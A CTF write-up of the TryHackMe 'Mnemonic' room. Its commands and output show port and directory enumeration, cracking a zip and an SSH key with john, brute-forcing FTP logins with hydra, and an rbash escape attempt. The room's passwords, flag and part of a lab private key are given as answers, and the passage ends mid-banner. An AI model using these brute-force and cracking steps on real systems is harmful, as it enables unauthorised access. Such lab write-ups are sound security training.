<p align="center">May 11, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{370}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/62cf4572-71af-43ed-898e-31c0887632ce" alt="Your Image Badge"></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Mnemonic}}$$</h1>
<p align="center"><em>I hope you have fun.</em>.<br>
It is classified as a mediumlevel CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/mnemonic</a>.</p>

<p align="center"> <img width="1000px" src=""> </p>


<br>
<br>


![image](https://github.com/user-attachments/assets/b3d9f441-f92c-4d5c-b68e-2d5d25456004)

<br>
<br>

<h2>Task 1 . Mnemonic</h2>

<h3>Hit me!</h3>
<p>You need 1 things : hurry up<br>
https://www.youtube.com/watch?v=pBSR3DyobIY</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>-</em><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code><br>

<br>
<br>

<h2>Task 2 . Enumerate</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 2.1. <em>How many open ports?</em><a id='2.1'></a>
>> <code><strong>3</strong></code><br>


<br>

> 2.2. <em>what is the ssh port number?</em><a id='2.2'></a>
>> <code><strong>1337</strong></code><br>

<br>


<h3 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h3>

<p align="center">There are have 3 ports open: <code>21/ftp</code>, <code>80/http</code> and <code>1337/ssh</code>. </p>

```bash
nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html)
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
```

<br>
<br>

> 2.3. <em>what is the name of the secret file?</em><a id='2.3'></a>
>> <code><strong>backups.zip</strong></code><br>

<br>
<br>



<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP}}$$</h3>
<p align="center"><code>Test</code></p>


![image](https://github.com/user-attachments/assets/9cf02354-efcf-430e-9edd-15a53962d9cd)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/robots.txt}}$$</h3>
<p align="center"><code>Dissalow: /webmasters/*</code></p>


![image](https://github.com/user-attachments/assets/a58d7b7e-5495-4542-abb5-55ac60c0a747)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{Gobuster x http://TargetIP/webmasters/}}$$</h3>
<p align="center"><code>/admin/</code> and <code>/backups/</code></p>

<br>

```bash
:~# gobuster dir -u http://TargetIP/webmasters/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -t 100
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin/               (Status: 200) [Size: 0]
/backups/             (Status: 200) [Size: 0]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


<br>

<h3 align="center">$$\textcolor{white}{\textnormal{Gobuster x http://TargetIP/webmasters/backups/}}$$</h3>
<p align="center"><code>backups.zip</code> and <code>index.html</code></p>

<br>

```bash
:~# gobuster dir -u http://TargetIP/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,zip,tar,gz,back.old,js,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TargetIP/webmasters/backups/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              back.old,js,txt,php,html,zip,tar,gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]
...
```

<br>
<br>

<h2>Task 3 . Credentials</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 3.1. <em>ftp user name?</em><a id='3.1'></a>
>> <code><strong>ftpuser</strong></code><br>

<br>

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/webmasters/backups/backups.zip}}$$</h3>
<p align="center"><code>backups.zip</code> downloaded</p>



![image](https://github.com/user-attachments/assets/e4cdd597-d5f3-4635-87a5-4fe269bfc372)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{zip2john X backups.zip }}$$</h3>
<p align="center"><code>hash</code></p>

<br>


```bash
:~# file backups.zip
backups.zip: Zip archive data, at least v1.0 to extract
:~# unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password:
...
:~# zip2john backups.zip > hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 type=8
:~# cat hash
backups.zip/backups/note.txt:$pkzip2$1*2*2*0*43*3c*aee718a8*42*4a*8*43*aee7*24e2*2918f93964f9ffa39d4a5fc0d589cae4222fd228a12bc6459bf7b383bdc3cd74557af7a16783ba3217388d2db639162dcee0456f5264bb1839b0f63a28de19581bda79*$/pkzip2$:backups/note.txt:backups.zip::backups.zip
```

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{john X hash }}$$</h3>
<p align="center"><code>00385007</code> --> <code>note.txt</code></p>

<br>

```bash
:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
...
Session completed. 
:~# unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt
:~# cd backups
:~/backups# ls
note.txt
```

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{cat X note.txt }}$$</h3>
<p align="center"><code>ftp username</code> : <code>ftpuser</code></p>

<br>

```bash
:~/backups# cat note.txt
@vill

James new ftp username: ftpuser
we have to work hard
:~/backups# 
```

<br>
<br>

> 3.2. <em>ftp password?</em><a id='3.2'></a>
>> <code><strong>love4ever</strong></code><br>

<br>

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{hydra x ftpuser}}$$</h3>
<p align="center"><code>ftpuser</code> : <code>love4ever</code></p>

<br>

```bash
:~/backups# hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://TargetIP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-10 03:05:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://TargetIP:21/
[STATUS] 222.00 tries/min, 222 tries in 00:01h, 14344176 to do in 1076:54h, 16 active
[STATUS] 250.33 tries/min, 751 tries in 00:03h, 14343647 to do in 954:59h, 16 active
[21][ftp] host: TargetIP   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
...
```

<br>
<br>

> 3.3. <em>What is the ssh username?</em><a id='3.3'></a>
>> <code><strong>james</strong></code><br>

<br>
<br>

> 3.4. <em>What is the ssh password?</em><a id='3.4'></a>
>> <code><strong>bluelove</strong></code><br>

<br>
<br>

> 3.5. <em>What is the condor password?</em><a id='3.4'></a>
>> <code><strong>pasificbell1981</strong></code><br>

<br>
<br>


<h3 align="center">$$\textcolor{white}{\textnormal{ftp --> ftpuser : love4ever}}$$</h3>
<p align="center"><code>ftpuser</code> : <code>love4ever</code></p>

<br>

```bash
~/Mnemonic# ftp TargetIP
Connected to TargetIP
...
Name (TargetIP:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------   12 1003     1003         4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
ftp> get not.txt
local: not.txt remote: not.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for not.txt (31 bytes).
226 Transfer complete.
31 bytes received in 0.01 secs (5.0897 kB/s)
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.00 secs (2.1211 MB/s)
ftp> exit
...
:~/Mnemonic# cat not.txt
james change ftp user password
:~/Mnemonic# ls
backups.zip  id_rsa  not.txt
:~/Mnemonic# locate ssh2john
/opt/john/ssh2john.py
:~/Mnemonic# python2 /opt/john/ssh2john.py id_rsa > hash
:~/Mnemonic# ls
backups.zip  hash  id_rsa  not.txt
:~/Mnemonic# john --worddlist=/usr/share/wordlists/rockyou.txt hash
Unknown option: "--worddlist=/usr/share/wordlists/rockyou.txt"
:~/Mnemonic# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)
1g 0:00:00:10 DONE (2025-05-10 23:11) 0.09842g/s 1411Kp/s 1411Kc/s 1411KC/s *7¡Vamos!
Session completed. 
:~/Mnemonic# 
...
:~/Mnemonic# chmod 600 id_rsa
:~/Mnemonic# ssh -p 1337 james@TargetIP
james@10.10.229.90's password: 
...
  => There is 1 zombie process.
51 packages can be updated.
0 updates are security updates.
...
james@mnemonic:~$ pwd
/home/james
james@mnemonic:~$ ls -la
total 44
drwx------  6 james james 4096 Jul 14  2020 .
drwxr-xr-x 10 root  root  4096 Jul 14  2020 ..
-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13  2020 .bashrc
drwx------  2 james james 4096 Jul 13  2020 .cache
drwx------  3 james james 4096 Jul 13  2020 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13  2020 .profile
drwx------  2 james james 4096 Jul 13  2020 .ssh
james@mnemonic:~$ cat 6450.txt
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption \u0130mage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
                                                                               
Broadcast message from root@mnemonic (somewhere) (Sat May 10 22:18:20 2025):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.                         
james@mnemonic:~$ ls -la
total 44
drwx------  6 james james 4096 Jul 14  2020 .
drwxr-xr-x 10 root  root  4096 Jul 14  2020 ..
-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 james james 3771 Jul 13  2020 .bashrc
drwx------  2 james james 4096 Jul 13  2020 .cache
drwx------  3 james james 4096 Jul 13  2020 .gnupg
drwxrwxr-x  3 james james 4096 Jul 13  2020 .local
-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13  2020 .profile
drwx------  2 james james 4096 Jul 13  2020 .ssh
james@mnemonic:~$ 
```

<br>
<br>



```bash
:~# ssh james@TargetIP
...
root@ip-10-10-108-227:~# gobuster dir -u http://10.10.2.180/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,zip,tar,gz,back.old,js,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.2.180/webmasters/backups/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              gz,back.old,js,txt,php,html,zip,tar
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess.tar        (Status: 403) [Size: 276]
/.htaccess.zip        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.gz         (Status: 403) [Size: 276]
/.htpasswd.tar        (Status: 403) [Size: 276]
/.htpasswd.zip        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess.back.old   (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.hta.zip             (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.js         (Status: 403) [Size: 276]
/.htpasswd.back.old   (Status: 403) [Size: 276]
/.htaccess.gz         (Status: 403) [Size: 276]
/.htaccess.js         (Status: 403) [Size: 276]
/.hta.gz              (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.tar             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.js              (Status: 403) [Size: 276]
/.hta.back.old        (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]
/index.html           (Status: 200) [Size: 0]
Progress: 41526 / 41535 (99.98%)
===============================================================
Finished
===============================================================
:~# file backups.zip
backups.zip: Zip archive data, at least v1.0 to extract
:~# zip2john backups.zip > hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 type=8
:~# ls
'=2.5,!=2.5.0,!=2.5.2,!=2.6'   Desktop        Pictures   snap
 backups.zip                   Downloads      Postman    thinclient_drives
 burp.json                     hash           Rooms      Tools
 CTFBuilder                    Instructions   Scripts
:~# cat hash
backups.zip/backups/note.txt:$pkzip2$1*2*2*0*43*3c*aee718a8*42*4a*8*43*aee7*24e2*2918f93964f9ffa39d4a5fc0d589cae4222fd228a12bc6459bf7b383bdc3cd74557af7a16783ba3217388d2db639162dcee0456f5264bb1839b0f63a28de19581bda79*$/pkzip2$:backups/note.txt:backups.zip::backups.zip
:~# cat note.txt
cat: note.txt: No such file or directory
:~# unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt        
:~# cd backups
:~/backups# ls
note.txt
:~/backups# cat note.txt
@vill

James new ftp username: ftpuser
we have to work hard
:~/backups# ftp TargetIP
...
220 (vsFTPd 3.0.3)
Name (10.10.2.180:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> cd data-4
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
-rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
-rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
226 Directory send OK.
ftp> get not.txt
local: not.txt remote: not.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for not.txt (31 bytes).
226 Transfer complete.
31 bytes received in 0.01 secs (5.4156 kB/s)
ftp> get id_rsa
local: id_rsa remote: id_rsa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for id_rsa (1766 bytes).
226 Transfer complete.
1766 bytes received in 0.07 secs (25.2221 kB/s)
ftp> exit
221 Goodbye.
root@ip-10-10-108-227:~/backups# cat not.txt
james change ftp user password
root@ip-10-10-108-227:~/backups# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3

pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
dkScGB/cHICB0cPvn3WU8ptdYCk78w9X9wHpPBa6VLk1eRi7MANLcfRWxQ4GFwXp
CP8KSSZBCduabfcx6eLBBM8fMC+P2kgtIOhnlpt/sAU2zDQa8kZHw8V76pzcBLka
...
czMMNJGJSoeA4UKNIuXFVIMbMcZD2fCKaKYWT6C0RDS0TrAf7AUurgHReAqsQhTE
xxaGq7DLLflzVHC7EY2VhdAWmbNbGQi/k7+4wC6HTRbnLMh2kTFYMbGA64hDHxFP
DYJh4ZCEDiyWe1JkmaeAAyc2n0TCVsgEzxgGPGe3tZynVML/rFWDMA0B5kZ9VLS7
j5NOaTeWFwVy55ONPzGgCICsj+izaOuCvsbdJQ7FdQ0LPNzZ/RUFvh4k7E1ZjBos
y9GNQW8WMAWH7SFK91KdX4c+fsAPnHN/v7uF/dRWlzkusrVLznURsVtG0k2BxUwx
PYn3OG7SwGS+DyiFvvV0NspX2oIXEqA6VioqQxc+0dcEGxcyNY5uDut3BENGPD+X
Ut/fe6bIfVse+ovAb6F36SBquuDjJWCHaHyVMASlmmzA6A6XhlSnrxhVP2/cmtdo
zUicXz715Li1enhR6p68AzGhBzYZsF/F9MSbrBgust0zDeNllL/4slZ9zfrg+zUY
weJKZAn1ib9/mG+PcdcPLFTcWIbXvigSx22svaiuG9WbVzU7GolkStYnrTPdDJ8M
Nw6TzknzJ6s79cg6cKPefrQVFXYXYxSZOvK/TElYrirHqBacVwIyMxCbOgoUbsF2
ipwD46fpPTKgP6qwDirNcKtULMtEud/rbqVvnP+fqm5UC+oqoX+lb1g2fvytTXSe
-----END RSA PRIVATE KEY-----
:~/backups# chmod 600 id_rsa
:~/backups# john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
No password hashes loaded (see FAQ)
root@ip-10-10-108-227:~/backups# ls
hash  id_rsa  note.txt  not.txt
:~/backups# ssh -i id_rsa james@TargetIP -p 1337
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.2.180]:1337' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
james@10.10.2.180's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)
...
  => There is 1 zombie process.
...
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption \u0130mage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
                                                                               
Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:54:28 2025):   
                                                                               
     IPS/IDS SYSTEM ON !!!!                                                    
 **     *     ****  **                                                         
         * **      *  * *                                                      
*   ****                 **                                                    
 *                                                                             
    * *            *                                                           
       *                  *                                                    
         *               *                                                     
        *   *       **                                                         
* *        *            *                                                      
              ****    *                                                        
     *        ****                                                             
                                                                               
 Unauthorized access was detected.                                             
                                                                               
which $SHELL
/bin/rbash
james@mnemonic:~$ which python3
/usr/bin/python3
james@mnemonic:~$ python3 -c "import pty;pty.spawn('bin/bash')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
 ...
james@mnemonic:~$ ls -lah
total 44K
drwx------  6 james james 4.0K Jul 14  2020 .
drwxr-xr-x 10 root  root  4.0K Jul 14  2020 ..
-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 james james 3.7K Jul 13  2020 .bashrc
drwx------  2 james james 4.0K Jul 13  2020 .cache
drwx------  3 james james 4.0K Jul 13  2020 .gnupg
drwxrwxr-x  3 james james 4.0K Jul 13  2020 .local
-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13  2020 .profile
drwx------  2 james james 4.0K Jul 13  2020 .ssh
james@mnemonic:~$ cd ..
-rbash: cd: restricted
james@mnemonic:~$ ls -lah
total 44K
drwx------  6 james james 4.0K Jul 14  2020 .
drwxr-xr-x 10 root  root  4.0K Jul 14  2020 ..
-rw-r--r--  1 vill  vill   116 Jul 14  2020 6450.txt
lrwxrwxrwx  1 james james    9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--  1 james james  220 Jul 13  2020 .bash_logout
-rw-r--r--  1 james james 3.7K Jul 13  2020 .bashrc
drwx------  2 james james 4.0K Jul 13  2020 .cache
drwx------  3 james james 4.0K Jul 13  2020 .gnupg
drwxrwxr-x  3 james james 4.0K Jul 13  2020 .local
-rw-r--r--  1 vill  vill   155 Jul 13  2020 noteforjames.txt
-rw-r--r--  1 james james  807 Jul 13  2020 .profile
drwx------  2 james james 4.0K Jul 13  2020 .ssh
james@mnemonic:~$ pwd
/home/james
james@mnemonic:~$ ls -lah /home
total 40K
drwxr-xr-x 10 root    root    4.0K Jul 14  2020 .
drwxr-xr-x 24 root    root    4.0K Jul 13  2020 ..
drwx------  2 root    root    4.0K Jul 14  2020 alex
drwxr--r--  6 condor  condor  4.0K Jul 14  2020 condor
drwx------ 12 ftpuser ftpuser 4.0K Jul 14  2020 ftpuser
drwx------  6 james   james   4.0K Jul 14  2020 james
drwx------  2 root    root    4.0K Jul 14  2020 jeff
drwx------  2 root    root    4.0K Jul 14  2020 john
drwx------  2 root    root    4.0K Jul 14  2020 mike
drwx------  4 vill    vill    4.0K Jul 14  2020 vill
james@mnemonic:~$ ls -lah /home/condor
ls: cannot access '/home/condor/..': Permission denied
ls: cannot access '/home/condor/'\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\''': Permission denied
ls: cannot access '/home/condor/.gnupg': Permission denied
ls: cannot access '/home/condor/.bash_logout': Permission denied
ls: cannot access '/home/condor/.bashrc': Permission denied
ls: cannot access '/home/condor/.profile': Permission denied
ls: cannot access '/home/condor/.cache': Permission denied
ls: cannot access '/home/condor/.bash_history': Permission denied
ls: cannot access '/home/condor/.': Permission denied
ls: cannot access '/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
total 0
d????????? ? ? ? ?            ?  .
d????????? ? ? ? ?            ?  ..
d????????? ? ? ? ?            ? 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
l????????? ? ? ? ?            ?  .bash_history
-????????? ? ? ? ?            ?  .bash_logout
-????????? ? ? ? ?            ?  .bashrc
d????????? ? ? ? ?            ?  .cache
d????????? ? ? ? ?            ?  .gnupg
-????????? ? ? ? ?            ?  .profile
d????????? ? ? ? ?            ? ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
                                                                               
Broadcast message from root@mnemonic (somewhere) (Sun May 11 15:56:58 2025):   
                                                                               
System Blocking is Starting ...
...                                                                                  
bybye!!!
...                                                       
Connection to TargetIP closed.
:~/backups#
```

<br>

```bash
:~# echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jp
:~# echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d 
THM{a5f82a00e2feee3465249b855be71c01}
```


<br>


![image](https://github.com/user-attachments/assets/b54977e1-db49-4419-96a0-b6b3d1b8788e)



<br>

```bash

~# wget https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
...
Length: 154514 (151K) [image/jpeg]
Saving to: \u2018maxresdefault.jpg\u2019

maxresdefault.jpg                          100%[=====================================================================================>] ...
:~# exiftool maxresdefault.jpg
ExifTool Version Number         : 11.88
File Name                       : maxresdefault.jpg
Directory                       : .
File Size                       : 151 kB
File Modification Date/Time     : 2025:05:11 17:03:51+01:00
File Access Date/Time           : 2025:05:11 17:03:51+01:00
File Inode Change Date/Time     : 2025:05:11 17:03:51+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1280
Image Height                    : 720
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1280x720
Megapixels                      : 0.922
:~# 
```

<br>

![image](https://github.com/user-attachments/assets/c3bd69cb-cc9a-4237-b132-69b5e88735be)



<br>

```bash
:~# apt install eog
...
:~# eog maxresdefault.jpg

```

<br>


![image](https://github.com/user-attachments/assets/717fc34a-47e9-4ad0-83ba-9d842bdd1cc4)



<br>

<p>https://github.com/MustafaTanguner/Mnemonic</p>


![image](https://github.com/user-attachments/assets/4c41bff9-9f0b-413f-899c-8fc9bc99bf2d)

<br>

```bash

:~/Mnemonic# git clone https://github.com/MustafaTanguner/Mnemonic.git 
Cloning into 'Mnemonic'...
...
Resolving deltas: 100% (88/88), done.
:~/Mnemonic/cd Mnemonic

:~/Mnemonic/Mnemonic# ls
image  LICENSE  Mnemonic.py  __pycache__  README.md  sozlukler.py
....
:~/Mnemonic# python3 Mnemonic.py


ooo        ooooo                                                                o8o            
`88.       .888'                                                                `"'            
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.  
